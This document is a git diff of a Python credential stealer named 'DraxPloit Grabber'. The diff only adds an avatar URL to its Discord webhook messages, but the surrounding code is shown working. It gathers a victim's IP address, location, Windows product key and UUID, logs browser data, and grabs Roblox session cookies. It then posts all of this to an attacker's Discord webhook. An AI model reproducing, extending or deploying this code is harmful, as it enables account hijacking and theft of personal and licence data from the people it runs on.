@@ -4,6 +4,7 @@ import os
 import asyncio
 import platform
 import subprocess
+
 from discord_webhook import DiscordWebhook,DiscordEmbed
 from typing import Union
 from sys import argv
@@ -21,6 +22,7 @@ class Exploit:
         self.w3bh00k = self.fetch_conf('yourwebhookurl')
         self.startupexe = self.fetch_conf("startup")
         self.robloxcookies = []
+        self.avatarURL = "https://avatars.githubusercontent.com/u/79086740?v=4"
 
     def fetch_conf(self, e: str) -> Union[str, bool]:
         return __config__.get(e)
@@ -55,7 +57,7 @@ class Exploit:
         self.log = f"**DraxPloit** beamed a new user! ```\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}\nTimezone: {timezone}\n\nOrg: {org}\nWindows-Key: {w1nk33y}\nWindows Version: {w1nv3r}\nUUID: {uuidwndz}```"
 
     def sendMainData(self):
-        data = {"content": self.log, "username": "DraxPloit Grabber Notifier"}
+        data = {"content": self.log, "username": "DraxPloit Grabber Notifier", "avatar_url": self.avatarURL}
         requests.post(self.w3bh00k, json = data)
 
     def edgeLog(self):
@@ -96,7 +98,7 @@ class Exploit:
 
     def sendCookieLog(self):
         if self.robloxcookies:
-            data = {"content": "Roblox coookie found: ```" + self.robloxcookies[0] +"```", "username": "DraxPloit Grabber Notifier"}
+            data = {"content": "Roblox coookie found: ```" + self.robloxcookies[0] +"```", "username": "DraxPloit Grabber Notifier", "avatar_url": self.avatarURL}
             requests.post(self.w3bh00k, json = data)
 
     browsers = [chromeLog, firefoxLog, operaLog, edgeLog]
@@ -116,7 +118,7 @@ class Exploit:
         embed.set_author(name="Drax#5934", icon_url="http://pixelartmaker-data-78746291193.nyc3.digitaloceanspaces.com/image/f253a7d09b602f4.png")
         embed.set_footer(text="https://github.com/DraxFM/DraxPloit-Grabber")
 
-        wb2 = DiscordWebhook(url=self.w3bh00k, username="DraxPloit Grabber Notifier")
+        wb2 = DiscordWebhook(url=self.w3bh00k, username="DraxPloit Grabber Notifier", avatar_url=self.avatarURL)
         wb2.add_embed(embed)
         res = wb2.execute()
         
